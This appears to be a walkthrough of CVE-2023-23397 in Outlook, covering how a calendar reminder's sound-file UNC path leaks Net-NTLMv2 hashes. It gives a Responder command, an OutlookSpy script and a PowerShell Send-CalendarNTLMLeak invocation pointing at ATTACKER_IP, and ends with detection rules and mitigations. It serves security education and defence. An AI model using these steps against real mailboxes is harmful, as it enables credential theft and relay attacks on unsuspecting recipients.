To exploit this vulnerability, an attacker must create a malicious calendar invitation that includes a reference to a sound file pointing to a file in a network share in the attacker's machine. At a low level, an Outlook email stores the reference to the sound file in an internal parameter called "PidLidReminderFileParameter". To ensure that the audio we embed in our malicious email will take precedence over the victim's default reminder configurations, we will also need to set another parameter called "PidLidReminderOverride" to true.

To set up the "PidLidReminderFileParameter" property to point to a network share, the attacker can specify a Universal Naming Convention (UNC) path instead of a local file. UNC is used in Windows operating systems to find network resources (files, printers, shared documents). These paths consist of a double backslash, the IP address or name of the computer hosting the resource, the share name and the file name. For example:
\\ATTACKER_IP\foo\bar.wav

When the victim receives the malicious email, the UNC path directs them to that SMB share, triggering the vulnerability. This causes the system to start an NTLM authentication process against the attacker's machine, leaking a Net-NTLMv2 hash that the attacker can later try to crack.
If for some reason the SMB protocol isn't a viable alternative to use, non-server versions of Windows will accept using UNC paths pointing to ports 80 or 443, and use HTTP to retrieve the file from a WebDAV-enabled web server. The syntax of such UNC path is as follows:

\\ATTACKER_IP@80\foo\bar.wav
OR
\\ATTACKER_IP@443\foo\bar.wav

This may be useful to bypass firewall restrictions preventing outgoing connections to port 445 (SMB).


Attack Phase
Let's craft a malicious email containing an appointment with the required parameters to trigger it.

Setting up Responder:
Since we expect the victim to trigger an authentication attempt against the attacker on port 445, we will set up Responder to handle the authentication process and capture the NetNTLM hash for us. If you are unfamiliar with Responder, it will simply emulate an SMB server and capture any authentication attempt against it.
responder -I <interface>

Attempting to Handcraft a Malicious Appointment:
- As a first attempt, we could manually create an appointment and edit the path to the reminder's sound file to point to a shared folder. To create an appointment, you will first need to click on the calendar and then on the New Appointment button.
- We will create an appointment that includes a reminder set in 0 minutes so that it triggers right after the victim receives it. We will also click on the Sound option to configure the reminder's sound file.
- We can try setting the sound file path to a UNC path that points to the Attacker's machine.
However, Outlook will silently ignore the UNC path and revert to using the default WAV file, which can be confirmed by going back to the Sound dialogue(if it isn't replaced, we can move further from here or we will need to install OutlookSpy plugin to aid us otherwise).

OutlookSpy:
Even if Outlook cannot set the reminder's sound file to a UNC path, we can use the OutlookSpy plugin to achieve this. This plugin will allow you to access all of Outlook's internal parameters directly, including the reminder's sound file.
You will need to install it manually before proceeding. Be sure to close Outlook before running the installer.
- To view our current appointment from OutlookSpy, click the OutlookSpy tab. Be sure to click the "CurrentItem" button from within the appointment, or you might modify different Outlook components.
- From this window, you can see the parameters associated with the appointment's reminder. We want to set the "ReminderSoundFile" parameter to the UNC path that points to Attacker's machine and set both the "ReminderOverrideDefault" and "ReminderPlaySound" to true. Just for reference, here's what each parameter does:
    ReminderPlaySound: boolean value that indicates if a sound will be played with the reminder.
    ReminderOverrideDefault: boolean value that indicates the receiving Outlook client to play the sound pointed by ReminderSoundFile, instead of the default one.
    ReminderSoundFile: string with the path to the sound file to be used. For our exploit, this will point to a bogus shared folder in attacker's machine.

We can use the script tab and the following script to change the parameters to the required values:
AppointmentItem.ReminderOverrideDefault = true
AppointmentItem.ReminderPlaySound = true
AppointmentItem.ReminderSoundFile = "\\<attacker's IP>\<share_folder>\file.wav"

Be sure to click the "Run" button for the changes to be applied. You can go back to the "Properties" tab to check that the values were correctly changed. Finally, save your appointment to add it to your calendar, making sure the reminder is set to "0 minutes" and that the appointment matches the current time and date, as we want it to trigger immediately.

If all went as expected, you should immediately see a reminder popping up. And you should receive the authentication attempt in your Responder console on the attacker's machine.


Weaponisation
Summarising the steps required to exploit the vulnerability, an attacker would need to:
- Create a malicious meeting/appointment with a custom reminder sound pointing to a UNC path on the attacker's machine.
- Send the invite to the victim via email.
- Wait for the reminder to trigger a connection against the attacker's machine.
- Capture the Net-NTLMv2 hash, use authentication relaying, or profit in any other way.

Steps 3 and 4 are already covered for us by Responder, but handcrafting the malicious appointment by hand is a bit tedious. Luckily, a couple of exploits are readily available for us to create and send a malicious appointment, one of which is provide in this repository. 

This Powershell exploit leverages Outlook's COM objects to build emails and appointments easily. It contains a couple of functions that we can use:
    Save-CalendarNTLMLeak: This function creates a malicious appointment and saves it to your own calendar. Useful for testing purposes.
    Send-CalendarNTLMLeak: This function creates a malicious appointment and sends it via email to a victim. The email invitation will be sent from your Outlook's current default account.


Using the Exploit:
Within powershell, you can import the exploit's functions with the "Import-Module" cmdlet. After that, both functions will be available in your current Powershell. To send an email with a malicious appointment, you can just run the following command:

PS C:\Users\User\Desktop\> Import-Module .\CVE-2023-23397.ps1
PS C:\Users\User\Desktop\> Send-CalendarNTLMLeak -recipient "test@test.com" -remotefilepath "\\ATTACKER_IP\foo\bar.wav" -meetingsubject "Random Meeting" -meetingbody "This is just a regular meeting invitation."

Since the exploit makes use of the current Outlook instance to send the email, you will likely get a couple of alerts asking you to grant permission to the script to send emails on your behalf. Make sure to press Allow as many times as needed. Marking the "Allow access for 10 minutes" checkbox should also help speed this process up.


Detection and Mitigation

Detection:
Now that we have gone through the steps to weaponize the CVE-2023-23397 attack on Outlook, let's talk about a few ways to detect this attack within the network. Each attack leaves patterns or artifacts that could help the detection team identify the threats. It all depends on the network visibility and the log sources that are being collected and providing the much important visibility.

Sigma Rules:
The appended Sigma rule detects Outlook initiating a connection to a WebDav or SMB share, indicating a post-exploitation phase. This Sigma Rule looks to detect "svchost.exe" spawning "rundll32.exe" with command arguments like C:\windows\system32\davclnt.dll,DavSetCookie, which indicates a post-exploitation/exfiltration phase. These SIGMA rules can be converted into the detection and monitoring tool to hunt for suspicious log activity within the network.

Yara Rule:
YARA rule looks for the pattern within the files on disk. The appended community YARA rules can be used to detect the suspicious MSG file on the disk with two properties discussed in the above tasks.

Microsoft has released a PowerShell script "CVE-2023-23397.ps1"  that will check the Exchange messaging items like Mail, calendar, and tasks to see if the IOCs related to the CVE-2023-23397 attack are found. The script can be used to audit and clean the detected items.

Mitigation:
This vulnerability is being exploited extensively in the wild. Some of the recommended steps as recommended by Microsoft in order to mitigate and avoid this attack are:
- Add users to the Protected Users Security Group, which prevents using NTLM as an authentication mechanism.
- Block TCP 445/SMB outbound from your network to avoid any post-exploitation connection.
- Use the PowerShell script released by Microsoft to scan against the Exchange server to detect any attack attempt.
- Disable WebClient service to avoid webdav connection.
